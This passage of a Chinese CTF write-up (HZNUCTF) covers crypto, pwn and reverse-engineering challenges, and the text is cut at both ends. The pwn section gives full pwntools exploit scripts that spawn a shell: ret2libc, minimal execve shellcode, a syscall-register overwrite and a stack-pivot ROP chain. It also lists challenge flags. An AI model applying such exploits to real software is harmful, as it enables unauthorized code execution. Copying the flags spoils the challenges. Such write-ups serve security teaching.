sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'e: '</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>end_m<span class="token punctuation">)</span>

end_h <span class="token operator">=</span> bytes_to_long<span class="token punctuation">(</span>sha256<span class="token punctuation">(</span><span class="token string">b'b'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>digest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
r_ <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>g<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span>p<span class="token punctuation">)</span><span class="token operator">%</span>q
s_ <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>end_h<span class="token operator">+</span>x<span class="token operator">*</span>r_<span class="token punctuation">)</span><span class="token operator">*</span>inverse<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>q<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">%</span>q
<span class="token keyword">print</span><span class="token punctuation">(</span>r_<span class="token punctuation">,</span>s_<span class="token punctuation">)</span>

sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'r: '</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>r_<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b's: '</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>s_<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>recvlines<span class="token punctuation">(</span><span class="token punctuation">)</span>

sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>

<p><img src="/images/1744633170180-60.png" alt="img" loading="lazy"></p>
<h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h3><p>栈溢出，打ret2libc。</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

io<span class="token operator">=</span>process<span class="token punctuation">(</span><span class="token string">"./pwn"</span><span class="token punctuation">)</span>
libc<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">"libc.so.6"</span><span class="token punctuation">)</span>

plt<span class="token operator">=</span><span class="token number">0x0401060</span>
got<span class="token operator">=</span><span class="token number">0x0404018</span>
rdi<span class="token operator">=</span><span class="token number">0x0401176</span>
start<span class="token operator">=</span><span class="token number">0x0401090</span>
ret<span class="token operator">=</span><span class="token number">0x040101a</span>

p<span class="token operator">=</span><span class="token string">b"A"</span><span class="token operator">*</span><span class="token number">120</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>rdi<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>got<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>plt<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>start<span class="token punctuation">)</span>
io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"name."</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span>
libc<span class="token punctuation">.</span>address<span class="token operator">=</span>u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"\x7f"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b"\x00"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">"puts"</span><span class="token punctuation">]</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>libc<span class="token punctuation">.</span>address<span class="token punctuation">)</span><span class="token punctuation">)</span>

p<span class="token operator">=</span><span class="token string">b"A"</span><span class="token operator">*</span><span class="token number">120</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>ret<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>rdi<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token builtin">next</span><span class="token punctuation">(</span>libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">b'/bin/sh'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">"system"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"name."</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span>

io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>

<h3 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h3><p>Shellcode 限制0x12 大小，不能在mmap可执行区域二次写。</p>
<p>所有寄存器都被清空了，除了rdi为mmap可执行区域。</p>
<p>改eax成execve系统调用，之后再加rdi到写入&#x2F;bin&#x2F;sh的偏移，最后syscall去拿shell。</p>
<p>eax省2字节</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

context<span class="token punctuation">.</span>arch<span class="token operator">=</span><span class="token string">"amd64"</span>

io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./pwn"</span><span class="token punctuation">)</span>

sc<span class="token operator">=</span>asm<span class="token punctuation">(</span><span class="token triple-quoted-string string">'''
mov eax, 0x3b
add rdi, 0xb
syscall
'''</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">b"/bin/sh"</span>

<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>sc<span class="token punctuation">)</span><span class="token punctuation">)</span>
io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>sc<span class="token punctuation">)</span>

io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>

<h3 id="stack"><a href="#stack" class="headerlink" title="stack"></a>stack</h3><p>第一次输入会在0x0404060处读0xa8 字节，第二次读有栈溢出，题目模拟了canary保护会跳到sub_4011B6。</p>
<p><img src="/images/1744633170177-2.png" alt="img" loading="lazy"></p>
<p>sub_4011B6会从qword_4040a0处拿rax， fd 拿rdi， buf拿rsi，count拿rdx。</p>
<p><img src="/images/1744633170177-3.png" alt="img" loading="lazy"></p>
<p>第一次写可以溢出到这些位置来改变syscall，伪造成execve(“&#x2F;bin&#x2F;sh”, 0, 0)。</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

io<span class="token operator">=</span>process<span class="token punctuation">(</span><span class="token string">"./pwn"</span><span class="token punctuation">)</span>

p<span class="token operator">=</span><span class="token string">b"A"</span><span class="token operator">*</span><span class="token number">64</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x3b</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x0404108</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span>
io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">"name?"</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span>
io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">"say?"</span><span class="token punctuation">,</span> <span class="token string">b"A"</span><span class="token operator">*</span><span class="token number">0x50</span><span class="token punctuation">)</span>

io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>

<h3 id="overflow"><a href="#overflow" class="headerlink" title="overflow"></a>overflow</h3><p>x86 静态编译，有栈溢出。</p>
<p><img src="/images/1744633170177-4.png" alt="img" loading="lazy"></p>
<p>返回之前可以栈迁移到任意地址，把栈迁移到第一次read再用第一次read写入rop即可。</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

io<span class="token operator">=</span>process<span class="token punctuation">(</span><span class="token string">"./pwn"</span><span class="token punctuation">)</span>
context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"tmux"</span><span class="token punctuation">,</span> <span class="token string">"splitw"</span><span class="token punctuation">,</span> <span class="token string">"-h"</span><span class="token punctuation">]</span>

eax<span class="token operator">=</span><span class="token number">0x080b470a</span>
ebx<span class="token operator">=</span><span class="token number">0x08049022</span>
ecx<span class="token operator">=</span><span class="token number">0x08049802</span>
edx<span class="token operator">=</span><span class="token number">0x08060bd1</span>

rop<span class="token operator">=</span>p32<span class="token punctuation">(</span>eax<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0xb</span><span class="token punctuation">)</span>
rop<span class="token operator">+=</span>p32<span class="token punctuation">(</span>ebx<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0x80ef344</span><span class="token punctuation">)</span>
rop<span class="token operator">+=</span>p32<span class="token punctuation">(</span>ecx<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
rop<span class="token operator">+=</span>p32<span class="token punctuation">(</span>edx<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
rop<span class="token operator">+=</span>p32<span class="token punctuation">(</span><span class="token number">0x08049c6a</span><span class="token punctuation">)</span>
rop<span class="token operator">+=</span><span class="token string">b"/bin/sh\0"</span>

<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>rop<span class="token punctuation">)</span><span class="token punctuation">)</span>
io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">"name?"</span><span class="token punctuation">,</span> rop<span class="token punctuation">)</span>

p<span class="token operator">=</span><span class="token string">b'A'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0x080EF320</span><span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span>
io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"right?"</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span>

io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>

<h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="Base64"><a href="#Base64" class="headerlink" title="Base64"></a>Base64</h3><p>Base64变种加密</p>
<pre class="language-c++" data-language="c++"><code class="language-c++">_BYTE *__fastcall sub_7FF7DC6C10E0(__int64 a1)
&#123;
  __int64 v2; &#x2F;&#x2F; rbx
  __int64 v3; &#x2F;&#x2F; rbp
  int v4; &#x2F;&#x2F; edx
  int v5; &#x2F;&#x2F; edi
  int v6; &#x2F;&#x2F; edx
  __int64 v7; &#x2F;&#x2F; r14
  size_t v8; &#x2F;&#x2F; rcx
  _BYTE *v9; &#x2F;&#x2F; r8
  __int64 v10; &#x2F;&#x2F; r9
  unsigned __int64 v11; &#x2F;&#x2F; rdx
  int v12; &#x2F;&#x2F; ecx
  unsigned int v13; &#x2F;&#x2F; ecx
  unsigned int v14; &#x2F;&#x2F; eax
  int v15; &#x2F;&#x2F; eax
  int v16; &#x2F;&#x2F; eax
  int v17; &#x2F;&#x2F; eax
  int v18; &#x2F;&#x2F; edi
  __int64 v19; &#x2F;&#x2F; rdx
  int v20; &#x2F;&#x2F; eax
  int v21; &#x2F;&#x2F; eax
  int v22; &#x2F;&#x2F; ecx
  unsigned int v23; &#x2F;&#x2F; edx
  int v24; &#x2F;&#x2F; ecx
  int v25; &#x2F;&#x2F; eax
  int v26; &#x2F;&#x2F; ecx
  unsigned int v27; &#x2F;&#x2F; ecx
  unsigned int v28; &#x2F;&#x2F; eax
  char v30[80]; &#x2F;&#x2F; [rsp+20h] [rbp-68h] BYREF
  int v31; &#x2F;&#x2F; [rsp+90h] [rbp+8h]

  v2 &#x3D; -1;
  strcpy(v30, &quot;GLp&#x2F;+Wn7uqX8FQ2JDR1c0M6U53sjBwyxglmrCVdSThAfEOvPHaYZNzo4ktK9iebI&quot;);
  do
    ++v2;
  while ( *(_BYTE *)(a1 + v2) );
  v3 &#x3D; 0;
  v4 &#x3D; (int)v2 &#x2F; 3;
  if ( (_DWORD)v2 &#x3D;&#x3D; 3 * ((int)v2 &#x2F; 3) )
  &#123;
    v5 &#x3D; 0;
    v6 &#x3D; 4 * v4;
  &#125;
  else if ( (int)v2 % 3 &#x3D;&#x3D; 1 )
  &#123;
    v5 &#x3D; 1;
    v6 &#x3D; 4 * v4 + 4;
  &#125;
  else if ( (int)v2 % 3 &#x3D;&#x3D; 2 )
  &#123;
    v5 &#x3D; 2;
    v6 &#x3D; 4 * v4 + 4;
  &#125;
  else
  &#123;
    v5 &#x3D; v31;
    v6 &#x3D; v31;
  &#125;
  v7 &#x3D; v6;
  v8 &#x3D; v6 + 1LL;
  if ( v6 &#x3D;&#x3D; -1 )
    v8 &#x3D; -1;
  v9 &#x3D; malloc(v8);
  if ( (int)v2 - v5 &gt; 0 )
  &#123;
    v10 &#x3D; a1 + 2;
    v11 &#x3D; ((int)v2 - v5 - 1LL) &#x2F; 3uLL + 1;
    do
    &#123;
      v3 +&#x3D; 4;
      v12 &#x3D; *(unsigned __int8 *)(v10 - 2) &gt;&gt; 2;
      v10 +&#x3D; 3;
      v13 &#x3D; v12 + 24;
      v14 &#x3D; v13 - 64;
      if ( v13 &lt;&#x3D; 0x40 )
        v14 &#x3D; v13;
      v9[v3 - 4] &#x3D; v30[v14];
      v15 &#x3D; ((*(unsigned __int8 *)(v10 - 4) &gt;&gt; 4) | (16 * (*(_BYTE *)(v10 - 5) &amp; 3))) - 40;
      if ( ((*(unsigned __int8 *)(v10 - 4) &gt;&gt; 4) | (16 * (*(_BYTE *)(v10 - 5) &amp; 3u))) + 24 &lt;&#x3D; 0x40 )
        v15 &#x3D; ((*(unsigned __int8 *)(v10 - 4) &gt;&gt; 4) | (16 * (*(_BYTE *)(v10 - 5) &amp; 3))) + 24;
      v9[v3 - 3] &#x3D; v30[v15];
      v16 &#x3D; ((*(unsigned __int8 *)(v10 - 3) &gt;&gt; 6) | (4 * (*(_BYTE *)(v10 - 4) &amp; 0xF))) - 40;
      if ( ((*(unsigned __int8 *)(v10 - 3) &gt;&gt; 6) | (4 * (*(_BYTE *)(v10 - 4) &amp; 0xFu))) + 24 &lt;&#x3D; 0x40 )
        v16 &#x3D; ((*(unsigned __int8 *)(v10 - 3) &gt;&gt; 6) | (4 * (*(_BYTE *)(v10 - 4) &amp; 0xF))) + 24;
      v9[v3 - 2] &#x3D; v30[v16];
      v17 &#x3D; (*(_BYTE *)(v10 - 3) &amp; 0x3F) - 40;
      if ( (*(_BYTE *)(v10 - 3) &amp; 0x3Fu) + 24 &lt;&#x3D; 0x40 )
        v17 &#x3D; (*(_BYTE *)(v10 - 3) &amp; 0x3F) + 24;
      v9[v3 - 1] &#x3D; v30[v17];
      --v11;
    &#125;
    while ( v11 );
  &#125;
  v18 &#x3D; v5 - 1;
  if ( !v18 )
  &#123;
    v25 &#x3D; (*(unsigned __int8 *)((int)v2 + a1 - 1) &gt;&gt; 2) - 40;
    if ( (*(unsigned __int8 *)((int)v2 + a1 - 1) &gt;&gt; 2) + 24 &lt;&#x3D; 0x40u )
      v25 &#x3D; (*(unsigned __int8 *)((int)v2 + a1 - 1) &gt;&gt; 2) + 24;
    v9[v7 - 4] &#x3D; v30[v25];
    v26 &#x3D; *(_BYTE *)((int)v2 + a1 - 1) &amp; 3;
    *(_WORD *)&amp;v9[v7 - 2] &#x3D; 15677;
    v27 &#x3D; 16 * v26 + 24;
    v28 &#x3D; v27 - 64;
    if ( v27 &lt;&#x3D; 0x40 )
      v28 &#x3D; v27;
    v9[v7 - 3] &#x3D; v30[v28];
    goto LABEL_37;
  &#125;
  if ( v18 !&#x3D; 1 )
  &#123;
LABEL_37:
    v9[v7] &#x3D; 0;
    return v9;
  &#125;
  v19 &#x3D; a1 + (int)v2;
  v20 &#x3D; (*(unsigned __int8 *)(v19 - 2) &gt;&gt; 2) - 40;
  if ( (*(unsigned __int8 *)(v19 - 2) &gt;&gt; 2) + 24 &lt;&#x3D; 0x40u )
    v20 &#x3D; (*(unsigned __int8 *)(v19 - 2) &gt;&gt; 2) + 24;
  v9[v7 - 4] &#x3D; v30[v20];
  v21 &#x3D; ((*(unsigned __int8 *)(v19 - 1) &gt;&gt; 4) | (16 * (*(_BYTE *)(v19 - 2) &amp; 3))) - 40;
  if ( ((*(unsigned __int8 *)(v19 - 1) &gt;&gt; 4) | (16 * (*(_BYTE *)(v19 - 2) &amp; 3u))) + 24 &lt;&#x3D; 0x40 )
    v21 &#x3D; ((*(unsigned __int8 *)(v19 - 1) &gt;&gt; 4) | (16 * (*(_BYTE *)(v19 - 2) &amp; 3))) + 24;
  v9[v7 - 3] &#x3D; v30[v21];
  v22 &#x3D; *(_BYTE *)(v19 - 1) &amp; 0xF;
  *(_WORD *)&amp;v9[v7 - 1] &#x3D; 61;
  v23 &#x3D; 4 * v22 + 24;
  v24 &#x3D; 4 * v22 - 40;
  if ( v23 &lt;&#x3D; 0x40 )
    v24 &#x3D; v23;
  v9[v7 - 2] &#x3D; v30[v24];
  return v9;
&#125;</code></pre>

<p>解密代码：</p>
<pre class="language-c++" data-language="c++"><code class="language-c++">#include &lt;iostream&gt;
#include &lt;windows.h&gt;
#include &lt;string&gt;
#include &lt;time.h&gt;

#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;

char *base64_decode(const char *input)
&#123;
    const char *base64_table &#x3D; &quot;GLp&#x2F;+Wn7uqX8FQ2JDR1c0M6U53sjBwyxglmrCVdSThAfEOvPHaYZNzo4ktK9iebI&quot;;

    unsigned char reverse_table[256] &#x3D; &#123;0&#125;;
    for (int i &#x3D; 0; i &lt; 64; i++)
    &#123;
        reverse_table[(unsigned char)base64_table[i]] &#x3D; i;
    &#125;

    size_t input_len &#x3D; strlen(input);
    size_t padding &#x3D; 0;

    if (input_len &gt; 0 &amp;&amp; input[input_len - 1] &#x3D;&#x3D; &#39;&#x3D;&#39;)
    &#123;
        padding++;
        if (input_len &gt; 1 &amp;&amp; input[input_len - 2] &#x3D;&#x3D; &#39;&#x3D;&#39;)
        &#123;
            padding++;
        &#125;
    &#125;

    size_t output_len &#x3D; (input_len * 3) &#x2F; 4 - padding;
    unsigned char *output &#x3D; (unsigned char *)malloc(output_len + 1);
    output[output_len] &#x3D; 0;

    size_t i &#x3D; 0, j &#x3D; 0;
    while (i &lt; input_len - padding)
    &#123;
        unsigned char b1, b2, b3, b4;

        unsigned char v1 &#x3D; reverse_table[input[i++]];
        unsigned char v2 &#x3D; reverse_table[input[i++]];
        unsigned char v3 &#x3D; (i &lt; input_len) ? reverse_table[input[i++]] : 0;
        unsigned char v4 &#x3D; (i &lt; input_len) ? reverse_table[input[i++]] : 0;

        b1 &#x3D; (v1 &gt; 24) ? (v1 - 24) : (v1 + 64 - 24);
        b2 &#x3D; (v2 &gt; 24) ? (v2 - 24) : (v2 + 64 - 24);
        b3 &#x3D; (v3 &gt; 24) ? (v3 - 24) : (v3 + 64 - 24);
        b4 &#x3D; (v4 &gt; 24) ? (v4 - 24) : (v4 + 64 - 24);

        if (j &lt; output_len)
            output[j++] &#x3D; (b1 &lt;&lt; 2) | (b2 &gt;&gt; 4);
        if (j &lt; output_len)
            output[j++] &#x3D; (b2 &lt;&lt; 4) | (b3 &gt;&gt; 2);
        if (j &lt; output_len)
            output[j++] &#x3D; (b3 &lt;&lt; 6) | b4;
    &#125;

    return (char *)output;
&#125;

int main()
&#123;
    const char *Enc&#x3D; &quot;AwLdOEVEhIWtajB2CbCWCbTRVsFFC8hirfiXC9gWH9HQayCJVbB8CIF&#x3D;&quot;;
    char *Decoded&#x3D; base64_decode(Enc);
    printf(&quot;%s\n&quot;, Decoded);
    free(decoded);
    return 0;
&#125;</code></pre>

<p>HZNUCTF{ad162c-2d94-434d-9222-b65dc76a32}</p>
<h3 id="水果忍者"><a href="#水果忍者" class="headerlink" title="水果忍者"></a>水果忍者</h3><p>主要dll目录：\水果忍者\Fruit Ninja_Data\Managed\Assembly-CSharp.dll</p>
<p>拖入dnSpy分析，是AES CBC加密。</p>
<p><img src="/images/1744633170177-5.png" alt="img" loading="lazy"></p>
<p>底下有密文、密钥、iv，直接解密即可。</p>
<p><img src="/images/1744633170177-6.png" alt="img" loading="lazy"></p>
<p><img src="/images/1744633170177-7.png" alt="img" loading="lazy"></p>
<p>HZNUCTF{de20-70dd-4e62-b8d0-06e}</p>
<h3 id="蛇年的本命语言"><a href="#蛇年的本命语言" class="headerlink" title="蛇年的本命语言"></a>蛇年的本命语言</h3><p>python程序解包得到pyc（python 3.8），使用uncompyle6解密得到代码。</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> collections <span class="token keyword">import</span> Counter
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Welcome to HZNUCTF!!!"</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Plz input the flag:"</span><span class="token punctuation">)</span>
ooo0oOoooOOO0 <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
oOO0OoOoo000 <span class="token operator">=</span> Counter<span class="token punctuation">(</span>ooo0oOoooOOO0<span class="token punctuation">)</span>
O0o00 <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>oOO0OoOoo000<span class="token punctuation">[</span>oOooo0OOO<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">for</span> oOooo0OOO <span class="token keyword">in</span> ooo0oOoooOOO0<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"ans1: "</span><span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>O0o00<span class="token punctuation">)</span>
<span class="token keyword">if</span> O0o00 <span class="token operator">!=</span> <span class="token string">"111111116257645365477364777645752361"</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"wrong_wrong!!!"</span><span class="token punctuation">)</span>
    exit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
iiIII <span class="token operator">=</span> <span class="token string">""</span>
<span class="token keyword">for</span> oOooo0OOO <span class="token keyword">in</span> ooo0oOoooOOO0<span class="token punctuation">:</span>
    <span class="token keyword">if</span> oOO0OoOoo000<span class="token punctuation">[</span>oOooo0OOO<span class="token punctuation">]</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">:</span>
        iiIII <span class="token operator">+=</span> oOooo0OOO <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>oOO0OoOoo000<span class="token punctuation">[</span>oOooo0OOO<span class="token punctuation">]</span><span class="token punctuation">)</span>
        oOO0OoOoo000<span class="token punctuation">[</span>oOooo0OOO<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        i11i1Iii1I1 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token builtin">ord</span><span class="token punctuation">(</span>oOooo0OOO<span class="token punctuation">)</span> <span class="token keyword">for</span> oOooo0OOO <span class="token keyword">in</span> iiIII<span class="token punctuation">]</span>
        ii1iIi1i11i <span class="token operator">=</span> <span class="token punctuation">[</span>
         <span class="token number">7</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">504</span><span class="token punctuation">,</span>
         <span class="token number">9</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">5</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">403</span><span class="token punctuation">,</span>
         <span class="token number">2</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">5</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">10</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">799</span><span class="token punctuation">,</span>
         <span class="token number">3</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">15</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">20</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">2938</span><span class="token punctuation">,</span>
         <span class="token number">5</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">15</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">20</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">19</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">1</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">2042</span><span class="token punctuation">,</span>
         <span class="token number">7</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">1</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">9</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">11</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">2</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">5</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">1225</span><span class="token punctuation">,</span>
         <span class="token number">11</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">22</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">33</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">44</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">55</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">66</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">77</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token 